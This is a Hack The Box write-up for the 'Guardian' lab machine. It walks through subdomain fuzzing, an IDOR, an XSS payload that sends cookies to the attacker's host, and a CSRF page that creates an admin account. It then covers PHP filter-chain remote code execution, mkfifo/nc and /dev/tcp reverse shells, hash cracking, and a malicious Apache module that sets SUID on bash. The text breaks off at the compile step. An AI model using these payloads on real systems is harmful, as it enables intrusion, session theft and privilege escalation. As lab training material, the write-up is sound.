# **Guardian - Hack The Box**

*Target Ip. Address : 10.129.237.248*

This is a hard-rated machine of Hack The Box. Let's start with nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.237.248

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 10:38 +0545
Nmap scan report for 10.129.237.248
Host is up (0.97s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.44 seconds
```

So, we have only 2 ports, port 22 (ssh) and port 80 (http). Let's add guardian.htb at our hosts file and see what it has for us.

```bash
kali@kali:cat /etc/hosts
10.129.237.248  guardian.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

We get a standard "Guardian University" website, there is not more here, so let's do subdomain fuzzing to see if anything interesting subdomains we find.

```bash
kali@kali:ffuf -u http://guardian.htb/ -H "Host: FUZZ.guardian.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/   
      v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://guardian.htb/
:: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
:: Header           : Host: FUZZ.guardian.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response status: 301
________________________________________________
portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 693ms]
gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 275ms]
:: Progress: [5000/5000] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:49] :: Errors: 0 :
```

We get 2 hits. Let's add portal.guardian.htb and gitea.guardian.htb on our hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.237.248  guardian.htb portal.guardian.htb gitea.guardian.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

So, portal.guardian.htb is a student login portal and gitea.guardian.htb is a gitea wedsite.

We will get back to gitea instance, let's focus on the student portal for now.
There is a help button, which provides us a default password for new accounts.

```text
Guardian University Student Portal Guide
Welcome to the Guardian University Student Portal! This guide will help you get started and
ensure your account is secure. Please read the instructions below carefully.
Important Login Information:
1. Your default password is: GU1234
2. For security reasons, you must change your password immediately after your first login.
3. To change your password:
- Log in to the student portal.
- Navigate to 'Account Settings' or 'Profile Settings'.
- Select 'Change Password' and follow the instructions.
Portal Features:
The Guardian University Student Portal offers a wide range of features to help you manage
your academic journey effectively. Key features include:
- Viewing your course schedule and timetables.
- Accessing grades and academic records.
- Submitting assignments and viewing feedback from faculty.
- Communicating with faculty and peers via the messaging system.
- Staying updated with the latest announcements and notices.
Tips for First-Time Users:
- Bookmark the portal login page for quick access.
- Use a strong, unique password for your account.
- Familiarize yourself with the portal layout and navigation.
- Check your inbox regularly for important updates.
Need Help?
If you encounter any issues while logging in or changing your password, please contact the
IT Support Desk at:
Email: support@guardian.htb
Remember, your student portal is the gateway to your academic journey at Guardian
University. Keep your credentials secure and never share them with anyone.
```

Also, the glaceholder on Username hints us with example Student ID (GUXXXXXXX)

At, the guardian.htb, we had noticed that student emails in student testimonials also matches similar to the Student ID.
Let's try the Student ID of Boone Basden and the default password.

<img width="1172" height="418" alt="Screenshot 2026-02-05 111156" src="https://github.com/user-attachments/assets/971acae1-ef0f-40da-a4c1-c8c2d5a2facc" />

```credentials
Username: GU0142023
Password: GU1234
```

We were able to successfully login with the default password for this student.

This is a basic student dashboard, nothing interesting.
The chats feature catches my attention, specially the url, which might be vulnerable to IDOR.

```url
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11
```

Let's create a list of numbers from 1-50.

```bash
kali@kali:seq 1 50 > nums.txt 
```

We will use ffuf clusterbomb for this one, or you can utiize burpsuite clusterbomb attack as well.

```bash
ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w nums.txt:FUZZ1 -w nums.txt:FUZZ2 -mode clusterbomb -H 'Cookie: PHPSESSID=j59pal1b977asie3r7nunl5360' -fl 178,164


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/   

      v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2
:: Wordlist         : FUZZ1: /home/kali/nums.txt
:: Wordlist         : FUZZ2: /home/kali/nums.txt
:: Header           : Cookie: PHPSESSID=j59pal1b977asie3r7nunl5360
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response lines: 178,164
________________________________________________

[Status: 200, Size: 7306, Words: 3055, Lines: 185, Duration: 576ms]
   * FUZZ1: 2
   * FUZZ2: 1

[Status: 200, Size: 7302, Words: 3055, Lines: 185, Duration: 527ms]
   * FUZZ1: 1
   * FUZZ2: 2

:: Progress: [2500/2500] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

We get 2 hits, let's see what we have. 

<img width="927" height="477" alt="Screenshot 2026-02-05 132225" src="https://github.com/user-attachments/assets/2e2b2576-8ea1-4fbf-a27a-d4a6163f25a9" />

Oh, we have a conversation between jamil.enockson and admin, and password of the gitea for jamil.enockson.

```credentials
Username: jamil.enockson
Password: DH.....03 
```

We are getting login error, so let's use email as a username, as we have info that the email ends with @guardian.htb.

```credentials
Username: jamil.enockson@guardian.htb
Password: DH.....03 
```

Now, we can successfully login to the gitea instance.

There are two repositories, guardian.htb and portal.guardian.htb.

I couldn't find anything interesting for some time, but found a MySQL password for root on config.php oh portal.guardian.htb.

```config.php
<?php
return [
   'db' => [
       'dsn' => 'mysql:host=localhost;dbname=guardiandb',
       'username' => 'root',
       'password' => 'Gu.....st',
       'options' => []
   ],
   'salt' => '8Sb)tM1vs1SS'
];
```

While, looking further I found out that it is using PhpSpreadSheet v 3.7.0, under it's dependencies.

There are many XSS vulnerabilities for the PhpSpreadSheet, but this one caught my eye "*https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx*"

You can create a malicious xlsx file, with one sheet having XSS payload.

```XSS_payload
"> <img src="x" onerror="fetch('http://10.10.16.26/log?c=' + document.cookie);">
```

And, note that MS-Excel willnot allow to have this long name for a sheet. So, I suggest you use this site: "https://www.treegrid.com/FSheet"

Upload the malicious xlsx file in the assignments tab, and start a python server at port you specify, to listen for any traffic.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After uploading the file, you should receive the session cookie in your python server.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.237.248 - - [05/Feb/2026 11:57:49] code 404, message File not found
10.129.237.248 - - [05/Feb/2026 11:57:49] "GET /log?c=PHPSESSID=snoqrck9rndtsnqeifp6cd7h7h HTTP/1.1" 404 -
```

So, after updating the session cookie, we now are lecturer.

After so much digging round, I found that there is a notice board, which will be reviewed by admin, and it verifies csrf token as well.

```csrf-tokens.php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
   global $global_tokens_file;
   return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
   global $global_tokens_file;
   $tokens = get_token_pool();
   $tokens[] = $token;
   file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
   $tokens = get_token_pool();
   return in_array($token, $tokens);
}
```

We can see that the csrf-tokens isnot deleted, thus the tokens can be reused.

And admin can create a user, which just validates the csrf tokens. So, we can abuse this potentially.

```createuser.php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
   header('Location: /login.php');
   exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

   $csrf_token = $_POST['csrf_token'] ?? '';

   if (!is_valid_token($csrf_token)) {
       die("Invalid CSRF token!");
   }

   $username = $_POST['username'] ?? '';
   $password = $_POST['password'] ?? '';
   $full_name = $_POST['full_name'] ?? '';
   $email = $_POST['email'] ?? '';
   $dob = $_POST['dob'] ?? '';
   $address = $_POST['address'] ?? '';
   $user_role = $_POST['user_role'] ?? '';

   // Check for empty fields
   if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
       $error = "All fields are required. Please fill in all fields.";
   } else {
       $password = hash('sha256', $password . $salt);

       $data = [
           'username' => $username,
           'password_hash' => $password,
           'full_name' => $full_name,
           'email' => $email,
           'dob' => $dob,
           'address' => $address,
           'user_role' => $user_role
       ];

       if ($userModel->create($data)) {
           header('Location: /admin/users.php?created=true');
           exit();
       } else {
           $error = "Failed to create user. Please try again.";
       }
   }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Create User - Admin Dashboard</title>
   <link href="../static/vendor/tailwindcss/tailwind.min.css" rel="stylesheet">
   <link href="../static/styles/icons.css" rel="stylesheet">
   <style>
       body {
           display: flex;
           height: 100vh;
           overflow: hidden;
       }

       .sidebar {
           flex-shrink: 0;
           width: 15rem;
           background-color: #1a202c;
           color: white;
       }

       .main-content {
           flex: 1;
           overflow-y: auto;
       }
   </style>
</head>

<body class="bg-gray-100">
   <div class="sidebar">
       <!-- Include Admin Sidebar -->
       <?php include '../includes/admin/sidebar.php'; ?>
   </div>

   <!-- Main Content -->
   <div class="main-content">
       <nav class="bg-white shadow-sm">
           <div class="mx-6 py-4">
               <h1 class="text-2xl font-semibold text-gray-800">Create New User</h1>
           </div>
       </nav>

       <div class="p-6">
           <div class="bg-white rounded-lg shadow p-6">
               <?php if (isset($error)): ?>
                   <div class="bg-red-100 text-red-700 p-4 rounded mb-4">
                       <?php echo htmlspecialchars($error); ?>
                   </div>
               <?php endif; ?>
               <form method="POST" class="space-y-4">
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Username</label>
                       <input type="text" name="username" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Password</label>
                       <input type="password" name="password" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Full Name</label>
                       <input type="text" name="full_name" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Email</label>
                       <input type="email" name="email" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Date of Birth (YYYY-MM-DD)</label>
                       <input type="date" name="dob" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">Address</label>
                       <textarea name="address" rows="3" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500"></textarea>
                   </div>
                   <div>
                       <label class="block text-sm font-medium text-gray-700">User Role</label>
                       <select name="user_role" required
                           class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                           <option value="student">Student</option>
                           <option value="lecturer">Lecturer</option>
                           <option value="admin">Admin</option>
                       </select>
                   </div>
                   <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($token) ?>">
                   <div class="flex justify-end">
                       <button type="submit" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">
                           Create User
                       </button>
                   </div>
               </form>
           </div>
       </div>
   </div>
</body>

</html>
```

So, we create a basic html file, with our own username, password, etc. and provide the csrf token.

```exploit.html
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <title>Exploit</title>
</head>
<body>
<h1>Exploit</h1>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
   <input type="hidden" name="username" value="hacker">
   <input type="hidden" name="password" value="hacker123">
   <input type="hidden" name="full_name" value="hacker User">
   <input type="hidden" name="email" value="hacker@guardian.htb">
   <input type="hidden" name="dob" value="2000-01-01">
   <input type="hidden" name="address" value="Everyehere">
   <input type="hidden" name="user_role" value="admin">
   <input type="hidden" name="csrf_token" value="1374dff08f5bb863a2a05adaab6b5df3">
</form>
<script>
   document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

Setup a listener on your machine.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Submit the notice request, you will get message that it will be approved by admin.
After sometime, we receive a connection on our listener.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.237.248 - - [05/Feb/2026 12:29:11] "GET /exploit.html HTTP/1.1" 200 -
```

Now, enter your credentials we forged abusing csrf to login as admin.

```credentials
Username: hacker
Password: hacker123
```

We successfully authenticated as admin, and we have an admin dashboard.

So, new reports menu appears, and the url contains the file parameters, possibly can lead to LFI.
I tried some basic LFI payloads, but failed.

We see the source code of the reports page.

```reports.php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
   header('Location: /login.php');
   exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
   die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system).php)$/', $report)) {
   die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <title>Reports Menu</title>
   <link href="../static/vendor/tailwindcss/tailwind.min.css" rel="stylesheet">
   <link href="../static/styles/icons.css" rel="stylesheet">
   <style>
       body {
           display: flex;
           height: 100vh;
           overflow: hidden;
           background-color: #f3f4f6;
       }

       .sidebar {
           flex-shrink: 0;
           background-color: #1e293b;
           color: white;
       }

       .main-content {
           flex: 1;
           overflow-y: auto;
       }
   </style>
</head>

<body class="bg-gray-100">
   <div class="sidebar"><?php include '../includes/admin/sidebar.php'; ?></div>
   <div class="main-content">
       <div class="flex-1 p-10">
           <h1 class="text-3xl font-bold mb-6 text-gray-800">Reports Menu</h1>
           <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
               <a href="?report=reports/enrollment.php" class="bg-white p-6 rounded-lg shadow hover:shadow-md transition">
                   <h2 class="text-xl font-semibold text-blue-600">Enrollment Report</h2>
                   <p class="text-gray-600">View enrollment statistics and trends.</p>
               </a>
               <a href="?report=reports/academic.php" class="bg-white p-6 rounded-lg shadow hover:shadow-md transition">
                   <h2 class="text-xl font-semibold text-purple-600">Academic Report</h2>
                   <p class="text-gray-600">Explore academic data like GPA and faculty info.</p>
               </a>
               <a href="?report=reports/financial.php" class="bg-white p-6 rounded-lg shadow hover:shadow-md transition">
                   <h2 class="text-xl font-semibold text-green-600">Financial Report</h2>
                   <p class="text-gray-600">Review financial figures and revenue trends.</p>
               </a>
               <a href="?report=reports/system.php" class="bg-white p-6 rounded-lg shadow hover:shadow-md transition">
                   <h2 class="text-xl font-semibold text-indigo-600">System Report</h2>
                   <p class="text-gray-600">Check system health and usage statistics.</p>
               </a>
           </div>

           <?php include($report); ?>
           
       </div>
   </div>
</body>

</html>
```

So, it basically blocks everything, unless it has distinct enrollment.php, academic.php, financial.php or system.php.

This, can be bypassed by using php filter chains.

We will use this "*https://github.com/synacktiv/php_filter_chain_generator*".

Clone the repository, and create a filter chain using that.

```bash
kali@kali:python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-
.
.
.
.
|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Append the generated payload in the url like this:

```url
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-
.
.
.
.
code|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp,system.php&cmd=whoami
```

<img width="930" height="357" alt="Screenshot 2026-02-05 124903" src="https://github.com/user-attachments/assets/3ad4e309-2294-4084-85c9-dc156a7416d7" />

Finally we have RCE, now time to get a reverse shell.

Start a listener on your attacker machine.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Use this format for the url.

```url
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-
.
.
.
|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp,system.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fbash%20-i%202%3E%261|nc%2010.10.16.26%204444%20%3E%2Ftmp%2Ff
```

You should receive a reverse shell on your listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.237.248-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/guardian~10.129.237.248-Linux-x86_64/2026_02_05-12_52_45-763.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@guardian:~/portal.guardian.htb/admin$ 
```

Since, we already had MySQL credentials, check if MySQL is running.

```bash
www-data@guardian:~/portal.guardian.htb/admin$ ss -tulnp
Netid         State          Recv-Q         Send-Q                  Local Address:Port                    Peer Address:Port         Process         
udp           UNCONN         0              0                       127.0.0.53%lo:53                           0.0.0.0:*                            
udp           UNCONN         0              0                             0.0.0.0:68                           0.0.0.0:*                            
tcp           LISTEN         0              70                          127.0.0.1:33060                        0.0.0.0:*                            
tcp           LISTEN         0              4096                    127.0.0.53%lo:53                           0.0.0.0:*                            
tcp           LISTEN         0              4096                        127.0.0.1:3000                         0.0.0.0:*                            
tcp           LISTEN         0              128                           0.0.0.0:22                           0.0.0.0:*                            
tcp           LISTEN         0              511                           0.0.0.0:80                           0.0.0.0:*                            
tcp           LISTEN         0              151                         127.0.0.1:3306                         0.0.0.0:*                            
tcp           LISTEN         0              128                              [::]:22                              [::]:*                            
```

So, MySQL is running, use the credentials we found at config.php to access.

```bash
www-data@guardian:~/portal.guardian.htb/admin$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or g.
Your MySQL connection id is 3378
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or 'h' for help. Type 'c' to clear the current input statement.

mysql> 
```

Inside the database, we find many usernames and passwords. To filter out let's see the user who have bash.

```bash
www-data@guardian:~/portal.guardian.htb/admin$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jamil:x:1000:1000:guardian:/home/jamil:/bin/bash
mark:x:1001:1001:ls,,,:/home/mark:/bin/bash
gitea:x:116:123:Git Version Control,,,:/home/gitea:/bin/bash
sammy:x:1002:1003::/home/sammy:/bin/bash
```

So, only users root, jamil, mark, gitea and Sammy has bash. We will only try to crack these users passwords, rest can be ignored.

So, we have password for 3 users.

```credentials
jamil.enockson:c1d8dfaeee103d01.....f09a0f02ff4f9a43ee440250
mark.pargetter:8623e713bb98.....bc4c9ee4ba1cc6f37f97a10e
sammy.treat:c7ea20ae5d78.....503b93379ba7a0d1c2
```

So, we create a python script to crack them. Note: We are using the salt we found in the config.php file in the gitea instance.

```crack.py
import hashlib

SALT = "8Sb)tM1vs1SS"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
HASH_FILE = "pass.txt"

def check_password(password: str, target_hash: str) -> bool:
   hashed = hashlib.sha256((password + SALT).encode()).hexdigest()
   return hashed == target_hash

with open(HASH_FILE, "r") as f:
   for line in f:
       user, target_hash = line.strip().split(":")
       with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as wf:
           for pwd in wf:
               pwd = pwd.strip()
               if check_password(pwd, target_hash):
                   print(f"[+] Found password for {user}: {pwd}")
                   break
           else:
               print(f"[-] Password for {user} not found")
```

Let's run the script and see how it goes.

```bash
kali@kali:python3 crack.py
[+] Found password for jamil.enockson: cop.....56
[-] Password for mark.pargetter not found
[-] Password for sammy.treat not found
```

So, we were able to crack the password for user jamil.enockson.
Let's login as jamil via ssh, so that we can have interactive pty.

```bash
kali@kali:ssh jamil@guardian.htb
The authenticity of host 'guardian.htb (10.129.237.248)' can't be established.
ED25519 key fingerprint is: SHA256:yDuqpioi/UxJDaMuo7cAS4YDvpjykfPdRibqdx+QE9k
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'guardian.htb' (ED25519) to the list of known hosts.
jamil@guardian.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/pro

System information as of Thu Feb  5 07:21:29 AM UTC 2026

 System load:  0.05              Processes:             237
 Usage of /:   65.8% of 8.12GB   Users logged in:       0
 Memory usage: 26%               IPv4 address for eth0: 10.129.237.248
 Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

8 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 5 07:21:30 2026 from 10.10.16.26
jamil@guardian:~$
```

Our first flag is located at the home directory.

```bash
jamil@guardian:~$ cat user.txt
36.....47
```

Checking sudo privileges we can run /opt/scripts/utilities/utilities.py as user mark.

```bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User jamil may run the following commands on guardian:
   (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Let's see how we can escalate to user mark.

```utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status

def main():
   parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
   parser.add_argument("action", choices=[
       "backup-db",
       "zip-attachments",
       "collect-logs",
       "system-status"
   ], help="Action to perform")

   args = parser.parse_args()
   user = getpass.getuser()

   if args.action == "backup-db":
       if user != "mark":
           print("Access denied.")
           sys.exit(1)
       db.backup_database()
   elif args.action == "zip-attachments":
       if user != "mark":
           print("Access denied.")
           sys.exit(1)
       attachments.zip_attachments()
   elif args.action == "collect-logs":
       if user != "mark":
           print("Access denied.")
           sys.exit(1)
       logs.collect_logs()
   elif args.action == "system-status":
       status.system_status()
   else:
       print("Unknown action.")

if __name__ == "__main__":
   main()
```

Nothing, here. Let's see it's libraries.

```bash
jamil@guardian:/opt/scripts/utilities/utils$ ls -la
total 24
drwxrwsr-x 2 root root   4096 Jul 10  2025 .
drwxr-sr-x 4 root admins 4096 Jul 10  2025 ..
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10  2025 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  257 Feb  5 07:28 status.py
```

Here, status.py is writable by user mark and group admins, and luckily, user jamil is on admins group.

```bash
jamil@guardian:/opt/scripts/utilities/utils$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

Edit the status.py, to provide a reverse shell as user mark back to our attacker machine.

```status.py
import os, subprocess
def system_status():
   os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.26/4444 0>&1' &")
```

Start a listener back on attacker machine.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now, use sudo command as mark, and should get a reverse shell back.

```bash
jamil@guardian:/opt/scripts/utilities$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

We get a hit!!! Now, we are user mark.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.237.248-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/guardian~10.129.237.248-Linux-x86_64/2026_02_05-13_26_05-711.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mark@guardian:/opt/scripts/utilities$
```

Checking the sudo privileges, we can run /usr/local/bin/safeapache2ctl as root.

```bash
mark@guardian:~$ sudo -l
Matching Defaults entries for mark on guardian:
   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User mark may run the following commands on guardian:
   (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Make a C file to make /bin/bash a SUID.

```exploit.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
   setuid(0);
   system("chmod +s /bin/bash");
}
```

Inside mark directory, there is confs directory, make a exploit.conf inside that directory.

```exploit.conf
LoadModule evil_module /home/mark/confs/exploit.so
```

Now, we need to compile the C file into .so file.

```bash
